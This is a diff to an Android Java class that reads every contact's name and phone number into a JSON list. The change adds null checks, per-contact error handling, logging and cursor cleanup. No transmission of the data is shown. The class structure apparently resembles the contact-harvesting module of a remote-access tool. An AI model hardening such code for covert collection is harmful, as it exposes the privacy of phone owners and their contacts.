@@ -16,31 +16,62 @@ import org.json.JSONObject;
 public class ContactsManager {
 
     public static JSONObject getContacts(){
-
+        Cursor cur = null;
         try {
             JSONObject contacts = new JSONObject();
             JSONArray list = new JSONArray();
-            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                    new String[] { ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null,  ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
+            
+            cur = MainService.getContextOfApplication().getContentResolver().query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                new String[] { 
+                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, 
+                    ContactsContract.CommonDataKinds.Phone.NUMBER
+                }, 
+                null, 
+                null,  
+                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
+            );
 
+            if (cur != null) {
+                while (cur.moveToNext()) {
+                    try {
+                        JSONObject contact = new JSONObject();
+                        
+                        int nameIndex = cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
+                        int numIndex = cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+                        
+                        if (nameIndex >= 0 && numIndex >= 0) {
+                            String name = cur.getString(nameIndex);
+                            String num = cur.getString(numIndex);
 
-            while (cur.moveToNext()) {
-                JSONObject contact = new JSONObject();
-                String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));// for  number
-                String num = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));// for name
-
-                contact.put("phoneNo", num);
-                contact.put("name", name);
-                list.put(contact);
-
+                            contact.put("phoneNo", num != null ? num : "Unknown");
+                            contact.put("name", name != null ? name : "Unknown");
+                            list.put(contact);
+                        }
+                    } catch (Exception e) {
+                        // Skip this contact if error, continue with others
+                        Log.e("ContactsManager", "Error reading individual contact", e);
+                    }
+                }
             }
+            
             contacts.put("contactsList", list);
+            Log.d("ContactsManager", "Collected " + list.length() + " contacts");
             return contacts;
-        } catch (JSONException e) {
-            e.printStackTrace();
+            
+        } catch (Exception e) {
+            Log.e("ContactsManager", "Error reading contacts", e);
+            return null;
+        } finally {
+            // Always close cursor to prevent memory leak
+            if (cur != null) {
+                try {
+                    cur.close();
+                } catch (Exception e) {
+                    Log.e("ContactsManager", "Error closing cursor", e);
+                }
+            }
         }
-        return null;
-
     }
 
 }
